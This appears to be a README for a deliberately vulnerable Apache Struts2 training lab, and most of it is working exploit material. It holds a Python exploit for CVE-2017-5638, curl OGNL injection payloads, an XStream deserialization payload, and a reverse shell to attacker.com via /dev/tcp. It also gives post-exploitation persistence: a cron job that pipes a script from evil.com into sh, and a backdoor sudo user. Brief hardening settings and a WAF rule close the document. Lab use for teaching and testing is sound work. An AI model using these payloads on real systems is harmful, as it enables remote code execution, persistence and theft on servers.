# Apache Struts2 Vulnerabilities

## Overview
Apache Struts2 has been plagued by numerous critical vulnerabilities over the years. This lab demonstrates multiple Struts2 RCE vulnerabilities including the infamous Equifax breach vulnerability.

## Quick Start

**Access URL**: http://localhost:8086

**Application**: Struts2 Showcase Application

**Key Vulnerabilities**:
- CVE-2017-5638 (Equifax breach)
- CVE-2018-11776
- CVE-2017-9791
- CVE-2017-9805

## Major Vulnerabilities

### 1. CVE-2017-5638 - Jakarta Multipart Parser RCE
The vulnerability that led to the Equifax breach.

```python
#!/usr/bin/env python3
# CVE-2017-5638 Exploit
import requests

def exploit_2017_5638(url, cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += f"(#cmd='{cmd}')."
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"
    
    headers = {
        'Content-Type': payload
    }
    
    try:
        response = requests.post(url, headers=headers)
        return response.text
    except Exception as e:
        return f"Error: {e}"

# Usage
print(exploit_2017_5638("http://localhost:8086/struts2-showcase/", "whoami"))
```

### 2. CVE-2018-11776 - Namespace RCE
OGNL injection through namespace.

```bash
# Exploit URL pattern
curl "http://localhost:8086/struts2-showcase/${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}/help.action"
```

### 3. CVE-2017-9791 - Struts1 Plugin RCE
```bash
# Exploit via Struts1 plugin
curl -X POST http://localhost:8086/struts2-showcase/integration/saveGangster.action \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
```

### 4. CVE-2017-9805 - XML Deserialization
REST plugin XML deserialization.

```python
#!/usr/bin/env python3
import requests

def exploit_2017_9805(url):
    xml_payload = """
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>calc</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
    """
    
    headers = {
        'Content-Type': 'application/xml'
    }
    
    response = requests.post(url, data=xml_payload, headers=headers)
    return response

# Usage
exploit_2017_9805("http://localhost:8086/struts2-rest-showcase/orders")
```

## OGNL Injection Patterns

### Basic OGNL Expressions
```java
// Command execution
%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='whoami').(#p=new java.lang.ProcessBuilder(#cmd)).(#process=#p.start())}

// File reading
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#a=@java.nio.file.Files@readAllLines(@java.nio.file.Paths@get('/etc/passwd'))).(#a)}

// System property access
%{@java.lang.System@getProperty('user.home')}

// Environment variables
%{@java.lang.System@getenv('PATH')}
```

### Advanced OGNL Payloads
```java
// Reverse shell
%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='bash -i >& /dev/tcp/attacker.com/4444 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}

// Write file
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#a=@java.nio.file.Files@write(@java.nio.file.Paths@get('/tmp/pwned.txt'),'hacked'.getBytes()))}
```

## Common Attack Vectors

### 1. Content-Type Header
```bash
curl -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
  http://localhost:8086/struts2-showcase/
```

### 2. URL Path
```bash
# In action name
curl "http://localhost:8086/struts2-showcase/$%7B(#_='multipart/form-data')...%7D.action"

# In namespace
curl "http://localhost:8086/$%7B(#_='multipart/form-data')...%7D/someAction.action"
```

### 3. Parameter Values
```bash
curl -X POST http://localhost:8086/struts2-showcase/person/save.action \
  -d "person.name=%{(#_='multipart/form-data')...}"
```

## Detection and Testing

### Manual Detection
```bash
# Check for OGNL evaluation
curl "http://localhost:8086/struts2-showcase/?debug=%{1+1}"
# Look for "2" in response

# Check version
curl -s http://localhost:8086/struts2-showcase/ | grep -i "struts"
```

### Automated Tools
```bash
# Struts-pwn
python struts-pwn.py -u http://localhost:8086/struts2-showcase/ -c whoami

# Metasploit modules
use exploit/multi/http/struts2_content_type_ognl
use exploit/multi/http/struts2_namespace_ognl
use exploit/multi/http/struts2_rest_xstream
```

## Post-Exploitation

### Information Gathering
```bash
# System info
%{@java.lang.System@getProperty('os.name')}
%{@java.lang.System@getProperty('java.version')}
%{@java.lang.System@getProperty('user.dir')}

# Network info
%{@java.net.InetAddress@getLocalHost().getHostName()}
%{@java.net.InetAddress@getLocalHost().getHostAddress()}
```

### Persistence
```bash
# Add cron job
%{(#cmd='echo "* * * * * curl evil.com/shell.sh | sh" | crontab').(#p=new java.lang.ProcessBuilder({'/bin/bash','-c',#cmd})).(#p.start())}

# Create user
%{(#cmd='useradd -m -s /bin/bash -G sudo hacker && echo "hacker:password" | chpasswd').(#p=new java.lang.ProcessBuilder({'/bin/bash','-c',#cmd})).(#p.start())}
```

## Mitigation

### Immediate Actions
1. Update to latest Struts version
2. Apply all security patches
3. Implement WAF rules
4. Disable dynamic method invocation

### Configuration Hardening
```xml
<!-- struts.xml -->
<struts>
    <!-- Disable dynamic method invocation -->
    <constant name="struts.enable.DynamicMethodInvocation" value="false"/>
    
    <!-- Restrict OGNL access -->
    <constant name="struts.ognl.allowStaticMethodAccess" value="false"/>
    
    <!-- Enable strict method invocation -->
    <constant name="struts.enable.StrictMethodInvocation" value="true"/>
    
    <!-- Whitelist allowed classes -->
    <constant name="struts.allowedClasses" value="java.lang.String,java.util.Date"/>
</struts>
```

### WAF Rules
```
# Block OGNL expressions
SecRule REQUEST_HEADERS|REQUEST_BODY|REQUEST_URI "@rx \%\{.*\}" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'Possible Struts2 OGNL Injection',\
    tag:'OWASP_CRS/WEB_ATTACK/STRUTS'"
```

## Learning Objectives
- Understanding OGNL injection
- Struts2 architecture vulnerabilities
- Deserialization attacks
- Header injection techniques
- Framework security hardening

## Additional Resources
- [Apache Struts Security Bulletins](https://struts.apache.org/security/)
- [CVE-2017-5638 Analysis](https://www.cisecurity.org/advisory/vulnerability-apache-struts-cve-2017-5638/)
- [Struts2 Security Guide](https://struts.apache.org/security/) 